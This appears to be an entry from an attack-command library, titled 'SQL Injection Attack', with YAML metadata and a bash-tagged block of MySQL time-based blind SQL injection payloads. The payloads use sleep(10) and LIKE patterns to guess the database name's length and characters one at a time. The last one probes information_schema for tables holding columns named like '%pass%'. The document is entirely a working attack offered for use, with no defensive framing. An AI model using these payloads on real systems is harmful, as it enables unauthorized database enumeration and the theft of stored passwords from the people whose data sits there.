---
id: 2939b844-d122-4b8f-860c-69f23ff6603a
name: SQL Injection Attack
type: command
executor: bash
data: "1 and (select sleep(10) from dual where database() like '%')#\n1 and (select\
  \ sleep(10) from dual where database() like '___')# \n1 and (select sleep(10) from\
  \ dual where database() like '____')#\n1 and (select sleep(10) from dual where database()\
  \ like '_____')#\n1 and (select sleep(10) from dual where database() like 'a____')#\n\
  ...\n1 and (select sleep(10) from dual where database() like 's____')#\n1 and (select\
  \ sleep(10) from dual where database() like 'sa___')#\n...\n1 and (select sleep(10)\
  \ from dual where database() like 'sw___')#\n1 and (select sleep(10) from dual where\
  \ database() like 'swa__')#\n1 and (select sleep(10) from dual where database()\
  \ like 'swb__')#\n1 and (select sleep(10) from dual where database() like 'swi__')#\n\
  ...\n1 and (select sleep(10) from dual where (select table_name from information_schema.columns\
  \ where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#"
output: null
created_at: '2023-04-06T03:56:34.688843+00:00'
updated_at: '2023-04-10T20:22:56.248298+00:00'
---

# SQL Injection Attack

```bash
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
...
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
...
1 and (select sleep(10) from dual where database() like 'sw___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
...
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```


